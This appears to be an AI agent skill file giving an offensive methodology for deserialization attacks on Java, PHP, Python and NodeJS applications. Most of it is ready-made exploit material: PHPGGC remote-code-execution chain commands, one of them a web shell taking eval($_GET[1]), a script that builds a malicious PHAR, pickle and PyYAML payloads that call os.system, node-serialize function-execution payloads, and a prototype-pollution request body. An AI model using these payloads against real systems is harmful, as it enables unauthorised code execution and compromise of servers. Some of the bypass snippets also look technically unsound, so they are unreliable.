---
name: deserialization-attacks
description: ULTIMATE Deserialization Attack methodology — Java/PHP/Python/NodeJS exploitation, ysoserial/PHPGGC/marshalsec tool commands, prototype pollution, JNDI, gadget chain detection.
---

# Deserialization Attacks — THE COMPLETE GUIDE

> **Purpose:** Turn raw serialized objects into RCE or data exposure across every major language/runtime. Cover detection, payload crafting, chain execution, filter bypass, evidence capture.
> **When to load this skill:** You see serialized blobs (base64, hex, raw binary), ObjectInputStream headers, PHP serialized strings, Python pickles, NodeJS `_$$ND_FUNC$$_`, or JSON/YAML configs that may reach an unsafe parser.

---

## 0. Quick Decision Tree: What Language / Format?

```
1. Raw bytes start with AC ED 00 05 OR base64 starts with rO0 → JAVA
   Test: file or base64 decode → hex starts with "ac ed 00 05"
   Tools: ysoserial, marshalsec, GadgetProbe, JDS, Freddy

2. String starts with a:{..., i:{..., O:{..., C:{..., r:..., R:... → PHP
   Test: visible letters/numbers/braces, class names inside
   Tools: PHPGGC, phar:// wrappers, manual POP chain

3. Starts with  or base64 has "gASV" → PYTHON
   Test: first byte 0x80 followed by protocol 2/3/4/5
   Tools: pickle, PyYAML/ruamel.yaml unsafe loaders, jsonpickle

4. JSON/HTML with {"_$$ND_FUNC$$_" or {"cryo"} or Server Actions with $ACTION_* → NODEJS
   Test: literal string "_$$ND_FUNC$$_" inside JSON blob
   Tools: node-serialize exploit scripts, manual __proto__ chains

5. XML with <java> / <object class="..."> → JAVA (XStream/XmlDecoder)
   Tools: ysoserial XML gadgets, marshalsec XML/XStream

6. YAML starting with "!!" or containing "!!python/object:" → PYTHON (or SnakeYAML Java)
   Tools: Unsafe PyYAML yaml.load(...) using Loader=yaml.FullLoader or default

7. JSON containing {"@class":"..."} or {"@type":"..."} → JAVA (FastJSON/Jackson) or .NET
   Tools: marshalsec JSON payloads, FastJSON PoCs
```

---

## 1. PHP Deserialization (POP Chains)

### 1.1 Magic Methods Trigger Map

| Method | Trigger | Abuse Vector |
|--------|---------|--------------|
| `__wakeup()` | Every `unserialize()` call | POP chain entry point; re-initialize objects with attacker data |
| `__unserialize($data)` | PHP 7.4+ replaces `__wakeup` | Same as wakeup, but receives the array directly |
| `__destruct()` | Object destruction/end of scope | Write files, eval code, perform action even if app catches errors |
| `__toString()` | Object cast to string (`echo`, concat, `(string)`) | Chain into string sinks: file operations, SQL, eval |
| `__sleep()` | `serialize()` call | Rarely useful offensively; may be abused if app re-serializes attacker input |
| `__get($name)` / `__set($name,$val)` | Accessing undefined props | Abuse when POP chain accesses `$this->nonexistent` |
| `__call($method,$args)` | Calling undefined method | Can be triggered through `call_user_func([$obj,'bad'])` |
| `__invoke()` | Object called as function `$obj()` | Direct RCE if attacker can invoke the object |

### 1.2 PHPGGC — Ultimate PHP Gadget Factory

```bash
# List available gadget chains
php ./tools/phpggc/phpggc -l

# Common chains
php ./tools/phpggc/phpggc Laravel/RCE1 'system("id")'
php ./tools/phpggc/phpggc Monolog/RCE1 'phpinfo();'
php ./tools/phpggc/phpggc Symfony/RCE1 'eval($_GET[1])'
php ./tools/phpggc/phpggc ZendFramework/RCE1 'system("id")'
php ./tools/phpggc/phpggc Doctrine/RCE1 'phpinfo()'
php ./tools/phpggc/phpggc Guzzle/RCE1 'system("id")'

# Generate base64-encoded payload
php ./tools/phpggc/phpggc Laravel/RCE1 'system("id")' -b

# Generate URL-encoded payload
php ./tools/phpggc/phpggc Laravel/RCE1 'system("id")' -u

# Write raw serialized payload to file
php ./tools/phpggc/phpggc Laravel/RCE1 'system("id")' -o /tmp/payload.ser

# Combine with PHAR wrapper for file-based deserialization
php ./tools/phpggc/phpggc --phar phar -a Laravel/RCE1 'system("id")' -o /tmp/malicious.phar
```

### 1.3 Phar:// Metadata Deserialization

```bash
# Step 1: Create a PHAR with malicious metadata
php -r '
$phar = new Phar("/tmp/exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new class { public function __destruct() { system("id"); } });
$phar->stopBuffering();
'

# Step 2: Trigger via any file operation on phar://
# file_exists("phar:///tmp/exploit.phar/test.txt")
# file_get_contents("phar:///tmp/exploit.phar/test.txt")
# include("phar:///tmp/exploit.phar/test.txt")
# imagecreatefromjpeg("phar:///tmp/exploit.phar")
# DOMDocument::load("phar:///tmp/exploit.phar")

# Bypassing phar:// block: use compress wrappers
phar://compress.bzip2:///tmp/exploit.phar.bz2
phar://compress.zlib:///tmp/exploit.phar.gz
```

### 1.4 Allowed Classes Bypass

```php
// If unserialize() uses allowed_classes
$data = unserialize($payload, ['allowed_classes' => ['AllowedClass1', 'AllowedClass2']]);

// Bypass 1: Abuse __PHP_Incomplete_Class if constructor is not restricted
// Bypass 2: Use references to leak/corrupt memory
$a = new stdClass; $a->b = &$a;
echo serialize($a);
// O:8:"stdClass":1:{s:1:"b";R:1;}

// Bypass 3: PHP 7.4+ __unserialize bypass via unserialize() call inside __wakeup
```

### 1.5 Reference Value Serialization Abuse

```
# Circular references can cause memory corruption / type confusion
a:1:{i:0;O:8:"stdClass":2:{s:1:"a";R:2;s:1:"b";s:4:"test";}}

# Property type confusion in PHP 7.4 typed properties
O:4:"User":1:{s:4:"name";a:0:{}}
# If User::$name is declared as string, array causes type confusion
```

### 1.6 Laravel Livewire Hydration Chain

```php
// Livewire serializes component state; if attacker controls input:
// 1. Uses __wakeup in UploadedFile / Livewire\TemporaryUploadedFile
// 2. Malicious file metadata
// 3. Triggers file operations -> phar:// or eval

# Generate with PHPGGC
php phpggc Laravel/RCE6 "system('id')" --laravel
```

---

## 2. Python Deserialization

### 2.1 Pickle Protocol & __reduce__

```python
import pickle, base64, os

class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Evil())).decode()
# Test: pickle.loads(base64.b64decode(payload))

# __reduce_ex__ (protocol 4+) bypass if __reduce__ is blocked
class Evil2:
    def __reduce_ex__(self, protocol):
        return (os.system, ('id',))

# Bypass using subclasses of legitimate types
class EvilDict(dict):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(EvilDict())).decode()
```

### 2.2 YAML Deserialization (PyYAML, ruamel.yaml)

```python
import yaml

# PyYAML unsafe loaders (FullLoader is still unsafe in many versions)
# Use yaml.load(data, Loader=yaml.FullLoader)
# Safe alternative: yaml.safe_load(data)

# Payload (PyYAML)
yaml_payload = "!!python/object/apply:os.system ['id']"
# Or for subprocess.Popen
yaml_payload = "!!python/object/apply:subprocess.Popen [['/bin/sh', '-c', 'id']]"
# Or for __import__
yaml_payload = "!!python/object/new:module.__import__('os').system ['id']"

# ruamel.yaml (similar unsafe behavior)
from ruamel.yaml import YAML
yaml = YAML(typ='unsafe')
data = yaml.load(yaml_payload)
```

### 2.3 jsonpickle

```python
import jsonpickle

# Payload using __reduce__
payload = '{"py/object": "__main__.Evil", "py/reduce": [{"py/type": "os.system"}, ["id"], null, null, null]}'
obj = jsonpickle.decode(payload)

# Or
payload = '{"py/object": "os.system", "py/args": ["id"]}'
```

### 2.4 Class Pollution (Python Prototype Pollution)

```python
class Base: pass
class Target(Base):
    x = 1

# Pollute Base -> affects all subclasses including Target
setattr(Base, 'x', 'pwned')
print(Target.x)  # 'pwned'
```

### 2.5 Sandbox Bypass

```python
class Bypass:
    def __reduce__(self):
        import builtins
        return (builtins.eval, ('__import__("os").system("id")',))

# Restricted environment bypass via __builtins__
class Bypass2:
    def __reduce__(self):
        return ((__builtins__['__import__']('os').system), ('id',))
```

---

## 3. NodeJS Deserialization

### 3.1 node-serialize (_$$ND_FUNC$$_ eval abuse)

```javascript
// Vulnerable deserialization
const serialize = require('node-serialize');
const obj = serialize.unserialize(payload);

// Payload structure:
{"rce":{"_$$ND_FUNC$$_":"function(){require('child_process').exec('id', function(err, stdout, stderr){ console.log(stdout); });}"}}

// Immediate execution variant (IIFE style):
{"rce":{"_$$ND_FUNC$$_":"function(){process.mainModule.require('child_process').execSync('id').toString();}()"}}

// Base64 encode if needed:
Buffer.from(JSON.stringify(payload)).toString('base64')
```

### 3.2 funcster (global context bypass)

```javascript
{"__function":"function(){ return process.mainModule.require('child_process').execSync('id') }"}
```

### 3.3 serialize-javascript

Standard usage is safe. Dangerous only if combined with eval():
```javascript
const evalResult = eval(serialize(payload)); // DANGEROUS
```

### 3.4 Cryo Library

```javascript
{"__fn":"function(){ require('child_process').execSync('id') }"}
{"__proto__": {"admin": true}}
```

### 3.5 React Server Components / CVE-2025-55182 (Server Actions Abuse)

Server Actions use multipart form data with `$ACTION_*` fields.
Example multipart body:
```
------WebKitFormBoundary
Content-Disposition: form-data; name="$ACTION_1_0"

{"key":"value","__proto__":{"admin":true}}
------WebKitFormBoundary--
```
